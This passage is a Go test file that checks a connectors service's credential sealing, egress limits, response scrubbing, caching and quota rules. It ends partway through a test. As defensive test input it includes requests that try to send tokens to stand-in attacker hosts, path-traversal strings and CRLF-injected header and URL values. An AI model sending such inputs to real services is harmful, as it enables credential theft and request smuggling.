package connectors

import (
	"context"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/momja/Exhibit/internal/egress"
	"github.com/momja/Exhibit/internal/secrets"
	"github.com/momja/Exhibit/internal/store"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func testService(t *testing.T) (*Service, string) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "app.db")
	db, err := store.OpenSQLite(path)
	require.NoError(t, err)
	t.Cleanup(func() { db.Close() })
	box, err := secrets.Load("connection-test-key", "")
	require.NoError(t, err)
	s := New(Config{Store: db, Box: box, StandinsEnabled: true, GateFactory: func(origins []string) (*egress.Gate, error) { return egress.NewForTests(origins, egress.Limits{}) }})
	require.NoError(t, db.PutArtifact(context.Background(), &store.Artifact{ID: "app", OwnerID: 1, Title: "Connected app", SourceBlobID: "body", Tier: store.Tier1}))
	return s, path
}
func testGate(t *testing.T, origins ...string) *egress.Gate {
	t.Helper()
	g, err := egress.NewForTests(origins, egress.Limits{})
	require.NoError(t, err)
	t.Cleanup(g.Close)
	return g
}
func doRequest(t *testing.T, s *Service, viewer int64, gate *egress.Gate, target string) (*egress.Response, error) {
	t.Helper()
	req, err := http.NewRequest(http.MethodGet, target, nil)
	require.NoError(t, err)
	return s.Do(context.Background(), viewer, "app", req, gate)
}

func TestNativeSecretsStaySealedAndOnlyReachTheGrantedOrigin(t *testing.T) {
	s, path := testService(t)
	ctx := context.Background()
	const secret = "exhibit-native-super-secret-4385"
	var seen atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seen.Add(1)
		assert.Equal(t, "Bearer "+secret, r.Header.Get("Authorization"))
		assert.Empty(t, r.Header.Get("Cookie"))
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"result":"ok","reflected":"%s"}`, r.Header.Get("Authorization"))
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Personal API", Recipe: "bearer", Origin: provider.URL, Secret: secret}, UnlimitedLimits())
	require.NoError(t, err)
	data, err := json.Marshal(c)
	require.NoError(t, err)
	assert.NotContains(t, string(data), secret)
	records, err := s.cfg.Store.ListConnections(ctx, 1)
	require.NoError(t, err)
	require.Len(t, records, 1)
	assert.NotContains(t, records[0].EncryptedSecret, secret)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	gate := testGate(t, provider.URL, "https://elsewhere.example.test")
	req, err := http.NewRequest(http.MethodGet, provider.URL+"/data", nil)
	require.NoError(t, err)
	req.Header.Set("Authorization", "attacker")
	req.Header.Set("Cookie", "private-browser-cookie")
	response, err := s.Do(ctx, 1, "app", req, gate)
	require.NoError(t, err)
	assert.NotContains(t, string(response.Body), secret)
	assert.Contains(t, string(response.Body), "credential redacted")
	_, err = doRequest(t, s, 1, gate, "https://elsewhere.example.test/collect")
	assert.ErrorIs(t, err, ErrEgress)
	assert.Equal(t, int32(1), seen.Load())
	allowed, err := s.AllowedEgress(ctx, 1, "app", []string{provider.URL, "https://elsewhere.example.test"})
	require.NoError(t, err)
	assert.Equal(t, []string{provider.URL}, allowed)
	_, err = s.cfg.Store.GetConnection(ctx, 2, c.ID)
	assert.ErrorIs(t, err, store.ErrNotFound)
	_, err = s.Grant(ctx, 2, "app", GrantRequest{ConnectionID: c.ID})
	assert.ErrorIs(t, err, store.ErrNotFound)
	bytes, err := os.ReadFile(path)
	require.NoError(t, err)
	assert.NotContains(t, string(bytes), secret)
}

func TestConnectionRecipeCannotChooseDangerousCredentialHeaders(t *testing.T) {
	s, _ := testService(t)
	for _, header := range []string{"Cookie", "Host", "Origin", "Content-Length", "Proxy-Authorization", "Sec-Fetch-Site", "X-Forwarded-For", "bad\r\nheader"} {
		_, err := s.Create(context.Background(), 1, CreateRequest{Name: "Bad", Recipe: "api-key", Origin: "https://api.example.test", Header: header, Secret: "secret"}, UnlimitedLimits())
		assert.ErrorIs(t, err, ErrInvalid, header)
	}
	_, err := s.Create(context.Background(), 1, CreateRequest{Name: "Bad", Recipe: "api-key", Origin: "http://127.0.0.1", Secret: "secret"}, UnlimitedLimits())
	assert.ErrorIs(t, err, ErrInvalid)
}

func TestBasicCredentialURLCacheAndDurableQuotaAcrossArtifacts(t *testing.T) {
	s, path := testService(t)
	ctx := context.Background()
	now := time.Date(2026, 10, 23, 12, 0, 0, 0, time.UTC)
	s.cfg.Now = func() time.Time { return now }
	var requests atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests.Add(1)
		assert.Equal(t, "/private-access-path/accounts", r.URL.Path)
		u, p, ok := r.BasicAuth()
		assert.True(t, ok)
		assert.Equal(t, "api-user", u)
		assert.Equal(t, "api-secret-2718", p)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"accounts":[{"name":"Checking","balance":"123.45"}],"url":%q,"errors":[]}`, r.URL.String())
	}))
	defer provider.Close()
	accessURL := strings.Replace(provider.URL, "https://", "https://api-user:api-secret-2718@", 1) + "/private-access-path"
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Private API", Recipe: "basic", AccessURL: accessURL, DailyLimit: 2, CacheMinutes: 3}, UnlimitedLimits())
	require.NoError(t, err)
	assert.Equal(t, "/", c.Endpoint)
	assert.Equal(t, 2, c.DailyLimit)
	assert.Equal(t, 3, c.CacheMinutes)
	assert.Zero(t, requests.Load(), "saving a pasted URL must never make a claim or other network request")
	raw, err := json.Marshal(c)
	require.NoError(t, err)
	for _, secret := range []string{accessURL, "api-user", "api-secret-2718", "private-access-path"} {
		assert.NotContains(t, string(raw), secret)
	}
	records, err := s.cfg.Store.ListConnections(ctx, 1)
	require.NoError(t, err)
	assert.NotContains(t, records[0].RecipeJSON, "private-access-path")
	assert.NotContains(t, records[0].RecipeJSON, "api-user")
	require.NoError(t, s.cfg.Store.PutArtifact(ctx, &store.Artifact{ID: "second", OwnerID: 1, Title: "Another client", SourceBlobID: "body", Tier: store.Tier1}))
	for _, artifactID := range []string{"app", "second"} {
		grant, err := s.Grant(ctx, 1, artifactID, GrantRequest{ConnectionID: c.ID})
		require.NoError(t, err)
		assert.Empty(t, grant.PermittedEgress)
		assert.Contains(t, grant.Consent, "nowhere else")
	}
	gate := testGate(t, provider.URL)
	for i := 0; i < 5; i++ {
		response, err := doRequest(t, s, 1, gate, provider.URL+"/accounts")
		require.NoError(t, err)
		assert.Contains(t, string(response.Body), "Checking")
		assert.Contains(t, string(response.Body), `"url":"/accounts"`)
		assert.Equal(t, provider.URL+"/accounts", response.URL)
		assert.NotContains(t, string(response.Body), "private-access-path")
	}
	assert.Equal(t, int32(1), requests.Load())
	// A fresh service and another artifact use the same durable encrypted
	// response and quota, rather than allocating a budget to each page.
	s = New(s.cfg)
	req, err := http.NewRequest(http.MethodGet, provider.URL+"/accounts", nil)
	require.NoError(t, err)
	response, err := s.Do(ctx, 1, "second", req, gate)
	require.NoError(t, err)
	assert.Contains(t, string(response.Body), "123.45")
	assert.Equal(t, int32(1), requests.Load())
	now = now.Add(3 * time.Minute)
	_, err = s.Do(ctx, 1, "second", req, gate)
	require.NoError(t, err, "expired response must be fetched again")
	assert.Equal(t, int32(2), requests.Load())
	_, err = doRequest(t, s, 1, gate, provider.URL+"/accounts?page=2")
	assert.ErrorIs(t, err, store.ErrConnectionQuota)
	assert.Equal(t, int32(2), requests.Load(), "refuse an exhausted daily budget before contacting the provider")
	// The cached result remains usable after the budget is spent.
	_, err = doRequest(t, s, 1, gate, provider.URL+"/accounts")
	require.NoError(t, err)
	assert.Equal(t, int32(2), requests.Load())
	now = now.Add(24 * time.Hour)
	_, err = doRequest(t, s, 1, gate, provider.URL+"/accounts?page=2")
	require.NoError(t, err, "the next UTC day starts a fresh budget")
	assert.Equal(t, int32(3), requests.Load())
	bytes, err := os.ReadFile(path)
	require.NoError(t, err)
	for _, secret := range []string{"api-user", "api-secret-2718", "private-access-path", "Checking", "123.45"} {
		assert.NotContains(t, string(bytes), secret)
	}
}

func TestBasicPastedURLPathAndRedirectCannotEscapePrivateBase(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var received, escaped atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		received.Add(1)
		switch r.URL.Path {
		case "/private-base/accounts":
			http.Redirect(w, r, "/outside", http.StatusFound)
		default:
			escaped.Add(1)
		}
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Scoped API", Recipe: "basic", AccessURL: strings.Replace(provider.URL, "https://", "https://user:private-password@", 1) + "/private-base"}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	gate := testGate(t, provider.URL)
	for _, path := range []string{"/../outside", "/%2e%2e/outside", "/%252e%252e/outside", "/%2f..%2foutside", "/%5c..%5coutside", "//outside"} {
		_, err := doRequest(t, s, 1, gate, provider.URL+path)
		assert.ErrorIs(t, err, ErrEgress, path)
	}
	assert.Zero(t, received.Load(), "reject traversal before provider contact")
	_, err = doRequest(t, s, 1, gate, provider.URL+"/accounts")
	assert.ErrorIs(t, err, ErrEgress)
	assert.Equal(t, int32(1), received.Load())
	assert.Zero(t, escaped.Load())
}

func TestConnectionCacheRespectsCurrentArtifactAndOperatorOrigins(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var received atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		received.Add(1)
		fmt.Fprint(w, `{"safe":"cached"}`)
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Cached API", Recipe: "bearer", Origin: provider.URL, Secret: "cached-api-secret", CacheMinutes: 5}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	_, err = doRequest(t, s, 1, testGate(t, provider.URL), provider.URL+"/data")
	require.NoError(t, err)
	_, err = doRequest(t, s, 1, testGate(t, "https://different.example.test"), provider.URL+"/data")
	assert.ErrorIs(t, err, ErrEgress)
	denied, err := egress.NewForTests([]string{provider.URL}, egress.Limits{OperatorDenyOrigins: []string{provider.URL}})
	require.NoError(t, err)
	defer denied.Close()
	_, err = doRequest(t, s, 1, denied, provider.URL+"/data")
	assert.ErrorIs(t, err, ErrEgress)
	assert.Equal(t, int32(1), received.Load())
}

func TestConnectionDailyQuotaCountsProviderRedirectHops(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var received atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		received.Add(1)
		http.Redirect(w, r, "/final", http.StatusFound)
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "One call", Recipe: "bearer", Origin: provider.URL, Secret: "redirect-api-secret", DailyLimit: 1}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	_, err = doRequest(t, s, 1, testGate(t, provider.URL), provider.URL+"/start")
	assert.ErrorIs(t, err, store.ErrConnectionQuota)
	assert.Equal(t, int32(1), received.Load(), "the second redirect hop must not spend a second provider request")
}

func TestLegacyNativeBasicShapeMigratesWithoutLosingCredentialOrCustody(t *testing.T) {
	s, path := testService(t)
	ctx := context.Background()
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "/legacy-private-base/accounts", r.URL.Path)
		u, p, ok := r.BasicAuth()
		assert.True(t, ok)
		assert.Equal(t, "legacy-user", u)
		assert.Equal(t, "legacy-password", p)
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer provider.Close()
	policy, err := json.Marshal(recipe{Origins: []string{provider.URL}, Header: "Authorization", Scheme: "Basic ", Sensitivity: "financial", DailyLimit: 24, CacheSeconds: 3600, Endpoint: "/accounts"})
	require.NoError(t, err)
	secret, err := json.Marshal(credential{Username: "legacy-user", Password: "legacy-password", Endpoint: "/legacy-private-base/accounts"})
	require.NoError(t, err)
	sealed, err := s.cfg.Box.Encrypt(string(secret))
	require.NoError(t, err)
	record := &store.ConnectionRecord{ID: "legacy-basic", OwnerID: 1, Name: "Earlier API", Provider: "legacy-native-service", Kind: "native", RecipeJSON: string(policy), EncryptedSecret: sealed}
	require.NoError(t, s.cfg.Store.CreateConnection(ctx, record, -1))
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: record.ID})
	require.NoError(t, err)
	require.NoError(t, s.cfg.Store.ReserveConnectionRequest(ctx, record.ID, 24, s.cfg.Now()))
	require.NoError(t, s.cfg.Store.PutConnectionCache(ctx, record.ID, "preserved", "encrypted-fixture", s.cfg.Now().Add(time.Hour)))
	// Run the shipped migration against a pre-upgrade record shape. Reading
	// its Up section also keeps this fixture independent of later migrations.
	migration, err := os.ReadFile("../store/migrations/047_generic_basic_connections.sql")
	require.NoError(t, err)
	up, _, found := strings.Cut(string(migration), "-- +goose Down")
	require.True(t, found)
	db, err := sql.Open("sqlite", path)
	require.NoError(t, err)
	_, err = db.Exec(up)
	require.NoError(t, err)
	require.NoError(t, db.Close())
	upgraded := s.cfg.Store
	record, err = upgraded.GetConnection(ctx, 1, record.ID)
	require.NoError(t, err)
	assert.Equal(t, "basic", record.Provider)
	assert.Equal(t, sealed, record.EncryptedSecret)
	meta, err := s.metadata(ctx, record)
	require.NoError(t, err)
	assert.Equal(t, 24, meta.DailyLimit)
	assert.Equal(t, 60, meta.CacheMinutes)
	assert.Equal(t, 1, meta.RequestsToday)
	assert.Equal(t, "/", meta.Endpoint)
	_, err = upgraded.GetConnectionCache(ctx, record.ID, "preserved", s.cfg.Now())
	assert.ErrorIs(t, err, store.ErrNotFound, "old viewer-scrubbed responses must not survive migration")
	policies, err := s.DataPolicies(ctx, 1, "app")
	require.NoError(t, err)
	require.Len(t, policies, 1)
	assert.Equal(t, []string{provider.URL}, policies[0].Origins)
	_, err = doRequest(t, s, 1, testGate(t, provider.URL), provider.URL+"/accounts")
	require.NoError(t, err)
	require.NoError(t, s.Ungrant(ctx, 1, "app", record.ID))
	policies, err = s.DataPolicies(ctx, 1, "app")
	require.NoError(t, err)
	require.Len(t, policies, 1, "migration and later disconnection must retain saved data custody")
}

func TestConnectionDailyQuotaIsAtomicAcrossArtifactsAndServiceInstances(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var received atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		received.Add(1)
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Shared budget", Recipe: "bearer", Origin: provider.URL, Secret: "atomic-budget-secret", DailyLimit: 1}, UnlimitedLimits())
	require.NoError(t, err)
	require.NoError(t, s.cfg.Store.PutArtifact(ctx, &store.Artifact{ID: "second", OwnerID: 1, Title: "Another client", SourceBlobID: "body", Tier: store.Tier1}))
	for _, id := range []string{"app", "second"} {
		_, err = s.Grant(ctx, 1, id, GrantRequest{ConnectionID: c.ID})
		require.NoError(t, err)
	}
	gate := testGate(t, provider.URL)
	start := make(chan struct{})
	errors := make(chan error, 2)
	var pending sync.WaitGroup
	for _, id := range []string{"app", "second"} {
		client := New(s.cfg) // Deliberately separate in-memory connection locks.
		pending.Add(1)
		go func() {
			defer pending.Done()
			<-start
			req, err := http.NewRequest(http.MethodGet, provider.URL+"/data?client="+id, nil)
			if err == nil {
				_, err = client.Do(ctx, 1, id, req, gate)
			}
			errors <- err
		}()
	}
	close(start)
	pending.Wait()
	close(errors)
	var successes, refused int
	for err := range errors {
		if err == nil {
			successes++
		} else {
			assert.ErrorIs(t, err, store.ErrConnectionQuota)
			refused++
		}
	}
	assert.Equal(t, 1, successes)
	assert.Equal(t, 1, refused)
	assert.Equal(t, int32(1), received.Load())
}

func TestConnectionCacheSeparatesForwardedRequestHeaders(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var received atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		received.Add(1)
		fmt.Fprintf(w, "range=%s;language=%s", r.Header.Get("Range"), r.Header.Get("Accept-Language"))
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Representations", Recipe: "bearer", Origin: provider.URL, Secret: "cache-header-secret", CacheMinutes: 5}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	gate := testGate(t, provider.URL)
	for i, headers := range []http.Header{
		{},
		{"Range": {"bytes=0-9"}},
		{"Accept-Language": {"nb"}},
		{"Accept-Language": {"en"}},
		{},
	} {
		req, err := http.NewRequest(http.MethodGet, provider.URL+"/data", nil)
		require.NoError(t, err)
		req.Header = headers
		resp, err := s.Do(ctx, 1, "app", req, gate)
		require.NoError(t, err)
		assert.Equal(t, "range="+headers.Get("Range")+";language="+headers.Get("Accept-Language"), string(resp.Body), i)
	}
	assert.Equal(t, int32(4), received.Load(), "the final identical request reuses the first response")
}

func TestPastedPrivateBaseIsScrubbedFromEscapedProviderResponses(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		body, err := json.Marshal(map[string]string{
			"path":          r.URL.Path,
			"escaped":       r.URL.EscapedPath(),
			"query_escaped": url.QueryEscape(r.URL.Path),
		})
		require.NoError(t, err)
		w.Write(body)
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Escaped API base", Recipe: "basic", AccessURL: strings.Replace(provider.URL, "https://", "https://api-user:api-password@", 1) + "/private%3Ctoken%3E"}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	response, err := doRequest(t, s, 1, testGate(t, provider.URL), provider.URL+"/accounts")
	require.NoError(t, err)
	assert.NotContains(t, string(response.Body), "private")
	assert.NotContains(t, response.URL, "private")
	var body map[string]string
	require.NoError(t, json.Unmarshal(response.Body, &body))
	assert.Equal(t, "/accounts", body["path"])
	assert.Equal(t, "/accounts", body["escaped"])
	assert.Equal(t, "/accounts", body["query_escaped"])
}

func TestConnectionCacheNeverStoresPartialOrVaryWildcardResponses(t *testing.T) {
	for _, kind := range []string{"partial", "vary"} {
		t.Run(kind, func(t *testing.T) {
			s, _ := testService(t)
			ctx := context.Background()
			var received atomic.Int32
			provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				received.Add(1)
				if kind == "vary" {
					w.Header().Set("Vary", "Accept, *")
				} else if r.Header.Get("Range") != "" {
					w.WriteHeader(http.StatusPartialContent)
					fmt.Fprint(w, "part")
					return
				}
				fmt.Fprint(w, "complete")
			}))
			defer provider.Close()
			c, err := s.Create(ctx, 1, CreateRequest{Name: "Uncacheable representations", Recipe: "bearer", Origin: provider.URL, Secret: "vary-test-secret", CacheMinutes: 5}, UnlimitedLimits())
			require.NoError(t, err)
			_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
			require.NoError(t, err)
			gate := testGate(t, provider.URL)
			for i := 0; i < 2; i++ {
				req, err := http.NewRequest(http.MethodGet, provider.URL+"/data", nil)
				require.NoError(t, err)
				if kind == "partial" {
					req.Header.Set("Range", "bytes=0-3")
				}
				_, err = s.Do(ctx, 1, "app", req, gate)
				require.NoError(t, err)
			}
			assert.Equal(t, int32(2), received.Load())
			if kind == "partial" {
				response, err := doRequest(t, s, 1, gate, provider.URL+"/data")
				require.NoError(t, err)
				assert.Equal(t, http.StatusOK, response.Status)
				assert.Equal(t, "complete", string(response.Body))
				assert.Equal(t, int32(3), received.Load())
			}
		})
	}
}

func TestConnectionWideCacheScrubsForEachViewerAndCurrentStandin(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	now := time.Date(2026, 10, 23, 12, 0, 0, 0, time.UTC)
	s.cfg.Now = func() time.Time { return now }
	const originalSecret = "cached-original-credential-7048"
	var received atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		received.Add(1)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"echo":%q}`, r.Header.Get("Authorization"))
	}))
	defer provider.Close()
	_, err := s.cfg.Store.UpsertUser(ctx, "owner", "owner@example.test")
	require.NoError(t, err)
	viewer, err := s.cfg.Store.UpsertUser(ctx, "recipient", "recipient@example.test")
	require.NoError(t, err)
	viewerID := viewer.ID
	require.NoError(t, s.cfg.Store.CreateShare(ctx, 1, &store.Share{ID: "named-recipient", ArtifactID: "app", RecipientID: &viewerID}))
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Shared cached API", Recipe: "bearer", Origin: provider.URL, Secret: originalSecret, DailyLimit: 1, CacheMinutes: 180}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID, ShareWithRecipients: true})
	require.NoError(t, err)
	ownerHandle, err := s.Standin(ctx, 1, "app", c.ID)
	require.NoError(t, err)
	recipientHandle, err := s.Standin(ctx, viewerID, "app", c.ID)
	require.NoError(t, err)
	gate := testGate(t, provider.URL)
	response, err := doRequest(t, s, 1, gate, provider.URL+"/data")
	require.NoError(t, err)
	assert.Contains(t, string(response.Body), ownerHandle.Value)
	assert.NotContains(t, string(response.Body), originalSecret)
	response, err = doRequest(t, s, viewerID, gate, provider.URL+"/data")
	require.NoError(t, err)
	assert.Contains(t, string(response.Body), recipientHandle.Value)
	assert.NotContains(t, string(response.Body), ownerHandle.Value)
	assert.NotContains(t, string(response.Body), originalSecret)
	policies, err := s.DataPolicies(ctx, viewerID, "app")
	require.NoError(t, err)
	assert.Len(t, policies, 2, "receiving a cached shared response still records recipient custody")
	// Rotation after a provider call must not lose the secret needed to scrub
	// a still-fresh cached response that reflected the previous access token.
	rotated, err := s.cfg.Box.Encrypt(`{"value":"rotated-credential-5061"}`)
	require.NoError(t, err)
	require.NoError(t, s.cfg.Store.UpdateConnectionSecret(ctx, 1, c.ID, rotated))
	now = now.Add(61 * time.Minute)
	freshHandle, err := s.Standin(ctx, viewerID, "app", c.ID)
	require.NoError(t, err)
	response, err = doRequest(t, s, viewerID, gate, provider.URL+"/data")
	require.NoError(t, err)
	assert.Contains(t, string(response.Body), freshHandle.Value)
	assert.NotContains(t, string(response.Body), recipientHandle.Value)
	assert.NotContains(t, string(response.Body), ownerHandle.Value)
	assert.NotContains(t, string(response.Body), originalSecret)
	assert.Equal(t, int32(1), received.Load(), "all viewers and renewed handles reuse one provider response")
	// With no active handle a cache delivery uses the neutral redaction mask.
	now = now.Add(61 * time.Minute)
	response, err = doRequest(t, s, viewerID, gate, provider.URL+"/data")
	require.NoError(t, err)
	assert.Contains(t, string(response.Body), "[credential redacted]")
	assert.NotContains(t, string(response.Body), standinPrefix)
	assert.Equal(t, int32(1), received.Load())
}

func TestBasicCredentialURLValidationAndNoSecretInErrors(t *testing.T) {
	s, _ := testService(t)
	const private = "do-not-reflect-this-secret"
	for _, raw := range []string{
		"http://user:" + private + "@api.example.test/base",
		"https://user@api.example.test/base",
		"https://user:@api.example.test/base",
		"https://:" + private + "@api.example.test/base",
		"https://user:" + private + "@api.example.test/base?token=private",
		"https://user:" + private + "@api.example.test/base?",
		"https://user:" + private + "@api.example.test/base#private",
		"https://user:" + private + "@api.example.test/base/../escape",
		"https://user:" + private + "@api.example.test/base/%252e%252e/escape",
		"https://user%3Aname:" + private + "@api.example.test/base",
		"https://user:" + private + "%0d%0a@api.example.test/base",
	} {
		_, err := s.Create(context.Background(), 1, CreateRequest{Name: "Invalid", Recipe: "basic", AccessURL: raw}, UnlimitedLimits())
		require.ErrorIs(t, err, ErrInvalid)
		assert.NotContains(t, err.Error(), private)
	}
	for _, in := range []CreateRequest{
		{Name: "Conflicting", Recipe: "basic", AccessURL: "https://u:p@api.example.test/private", Origin: "https://other.example.test"},
		{Name: "Wrong kind", Recipe: "bearer", AccessURL: "https://u:p@api.example.test/private"},
		{Name: "Negative limit", Recipe: "bearer", Origin: "https://api.example.test", Secret: private, DailyLimit: -1},
		{Name: "Negative reuse", Recipe: "bearer", Origin: "https://api.example.test", Secret: private, CacheMinutes: -1},
		{Name: "Overflow reuse", Recipe: "bearer", Origin: "https://api.example.test", Secret: private, CacheMinutes: int(^uint(0) >> 1)},
	} {
		_, err := s.Create(context.Background(), 1, in, UnlimitedLimits())
		require.ErrorIs(t, err, ErrInvalid)
		assert.NotContains(t, err.Error(), private)
	}
	valid, err := s.Create(context.Background(), 1, CreateRequest{Name: "Escaped credentials", Recipe: "basic", AccessURL: "https://user%40mail:p%3Aword%40host@api.example.test/private%20base/"}, UnlimitedLimits())
	require.NoError(t, err)
	assert.Equal(t, []string{"https://api.example.test"}, valid.Origins)
	record, err := s.cfg.Store.GetConnection(context.Background(), 1, valid.ID)
	require.NoError(t, err)
	_, credential, err := s.readCredential(record)
	require.NoError(t, err)
	assert.Equal(t, "user@mail", credential.Username)
	assert.Equal(t, "p:word@host", credential.Password)
	assert.Equal(t, "/private%20base", credential.BasePath)
}

func TestStandinsCannotReflectOrLeaveReviewedPositions(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	const secret = "standin-real-credential-6891"
	var count atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		count.Add(1)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"echo":%q}`, r.Header.Get("Authorization"))
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "API", Recipe: "bearer", Origin: provider.URL, Secret: secret}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	token, err := s.Standin(ctx, 1, "app", c.ID)
	require.NoError(t, err)
	gate := testGate(t, provider.URL, "https://attacker.example.test")
	req, _ := http.NewRequest(http.MethodGet, provider.URL+"/echo", nil)
	req.Header.Set("Authorization", "Bearer "+token.Value)
	resp, err := s.Do(ctx, 1, "app", req, gate)
	require.NoError(t, err)
	assert.NotContains(t, string(resp.Body), secret)
	assert.Contains(t, string(resp.Body), token.Value)
	for _, target := range []string{provider.URL + "/echo?value=" + url.QueryEscape(token.Value), "https://attacker.example.test/steal"} {
		req, _ = http.NewRequest(http.MethodGet, target, nil)
		req.Header.Set("Authorization", "Bearer "+token.Value)
		_, err = s.Do(ctx, 1, "app", req, gate)
		assert.Error(t, err)
	}
	req, _ = http.NewRequest(http.MethodGet, provider.URL+"/echo", nil)
	req.Header.Set("Accept", token.Value)
	_, err = s.Do(ctx, 1, "app", req, gate)
	assert.ErrorIs(t, err, ErrStandin)
	req, _ = http.NewRequest(http.MethodPost, provider.URL+"/echo", strings.NewReader(token.Value))
	_, err = s.Do(ctx, 1, "app", req, gate)
	assert.ErrorIs(t, err, ErrStandin)
	req, _ = http.NewRequest(http.MethodGet, provider.URL+"/echo", nil)
	req.Header.Set("Authorization", "Bearer "+token.Value)
	_, err = s.Do(ctx, 2, "app", req, gate)
	assert.ErrorIs(t, err, ErrStandin)
	assert.Equal(t, int32(1), count.Load())
}

func TestNativeCredentialIsNotForwardedAcrossRedirectOrigins(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var stolen atomic.Int32
	attacker := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { stolen.Add(1) }))
	defer attacker.Close()
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { http.Redirect(w, r, attacker.URL+"/collect", 302) }))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "API", Recipe: "bearer", Origin: provider.URL, Secret: "redirect-secret-9472"}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID, PermittedEgress: []string{attacker.URL}})
	require.NoError(t, err)
	_, err = doRequest(t, s, 1, testGate(t, provider.URL, attacker.URL), provider.URL+"/data")
	assert.ErrorIs(t, err, ErrEgress)
	assert.Zero(t, stolen.Load())
}

func TestSharedStateAndPublicLinksNeedExplicitConnectionConsent(t *testing.T) {
	for _, mode := range []string{"shared", "public"} {
		t.Run(mode, func(t *testing.T) {
			s, _ := testService(t)
			ctx := context.Background()
			c, err := s.Create(ctx, 1, CreateRequest{Name: "Bank", Recipe: "bearer", Origin: "https://api.example.test", Secret: "secret"}, UnlimitedLimits())
			require.NoError(t, err)
			if mode == "shared" {
				require.NoError(t, s.cfg.Store.UpdateArtifact(ctx, 1, "app", map[string]any{"share_state_mode": store.ShareStateShared}))
			} else {
				require.NoError(t, s.cfg.Store.CreateShare(ctx, 1, &store.Share{ID: "public", ArtifactID: "app"}))
			}
			_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
			assert.ErrorIs(t, err, ErrInvalid)
			g, err := s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID, ShareWithRecipients: true})
			require.NoError(t, err)
			assert.True(t, g.ShareWithRecipients)
